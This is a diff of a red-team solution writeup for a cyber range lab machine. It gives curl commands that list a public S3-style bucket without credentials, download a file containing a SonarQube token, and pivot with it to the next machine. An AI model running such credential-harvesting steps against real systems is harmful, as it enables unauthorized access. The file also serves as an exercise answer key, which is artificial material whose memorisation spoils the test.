@@ -1,50 +1,59 @@
 # solve_red.md — M3 · dev-artifacts
 ## Red Team Solution Writeup
+**Range:** RNG-DEV-01 · VIKAS TANTRA
 **Machine:** M3 — PUL Build Artifact Store
-**Vulnerability:** Public S3 Bucket ACL Misconfiguration
-**MITRE:** T1530 (Data from Cloud Storage Object)
+**Vulnerability:** Public-read ACL on the `pul-code-reports` bucket
+**MITRE ATT&CK:** T1530
 
 ---
+
 ## Objective
-Access the PUL Build Artifact Store. The `pul-code-reports` bucket is publicly listable and downloadable without credentials. Find and download `sonarqube-access.env`, which contains a SonarQube token.
 
----
-## Step-by-Step
+Verify that `pul-code-reports` can be listed without credentials, then retrieve `sonarqube-access.env` to continue to M4.
 
-### Step 1 — Discover Service
+## Environment
+
+| Item | Value |
+|---|---|
+| Artifact store | `203.0.3.36:9000` |
+| Bucket | `pul-code-reports` |
+| Authentication | Not required for the exposed bucket reads |
+| Credential object | `sonar-integration/sonarqube-access.env` |
+| Next machine | M4 SonarQube portal, port `9200` |
+
+## Step-by-Step Exploitation
+
+### Step 1 — Confirm the public bucket response
+
 ```bash
-curl --max-time 8 -fsS http://203.0.3.36:9000/pul-code-reports/ | head -30
+curl --max-time 8 -fsS http://203.0.3.36:9000/pul-code-reports/ | sed 's/></>\n</g' | head -12
 ```
-No auth header sent — server returns S3 XML listing (bucket is public).
 
+The unauthenticated request returns an S3 bucket listing.
 
+### Step 2 — List bucket objects
 
-
-
-### Step 2 — List Public Bucket
 ```bash
-curl --max-time 8 -fsS "http://203.0.3.36:9000/pul-code-reports/?list-type=2"
+curl --max-time 8 -fsS "http://203.0.3.36:9000/pul-code-reports/?list-type=2" | grep -o '<Key>[^<]*</Key>'
 ```
-XML response shows three objects including `sonar-integration/sonarqube-access.env`.
 
+The listing includes `sonar-integration/sonarqube-access.env`.
 
+### Step 3 — Retrieve the credential file
 
-### Step 3 — Download Credential File
 ```bash
 curl --max-time 8 -fsS "http://203.0.3.36:9000/pul-code-reports/sonar-integration/sonarqube-access.env" -o "$RANGE3_DIR/sonarqube-access.env"
 sed -E 's/=.*/=<redacted>/' "$RANGE3_DIR/sonarqube-access.env"
 ```
-Output:
-```
-# PUL SonarQube Integration Credentials
-SONAR_TOKEN=<redacted>
-SONAR_HOST=11.x.x.x
-SONAR_PORT=9200
-SONAR_PROJECT_KEY=pul-firmware-ota
-```
 
-The file's `SONAR_HOST` value is the scenario placeholder `11.x.x.x`; use `203.0.3.36` for the deployed M4 service. The token remains in `$RANGE3_DIR/sonarqube-access.env` and is not printed above.
+The file contains a SonarQube token for project `pul-firmware-ota`. The token value is redacted from this public writeup and remains in the private file for the next step. The file's `SONAR_HOST` is the placeholder `11.x.x.x`; use `203.0.3.36` for this deployed M4 service.
 
+## MITRE ATT&CK Mapping
 
+| Tactic | Technique | ID |
+|---|---|---|
+| Collection | Data from Cloud Storage Object | T1530 |
 
-**Pivot:** SonarQube token from the exposed object → M4 SonarQube Code Intelligence (`203.0.3.36:9200`)
+## Pivot
+
+Use the `SONAR_TOKEN` saved in `$RANGE3_DIR/sonarqube-access.env` for M4. The exposed object is a lab credential; do not reuse it elsewhere.
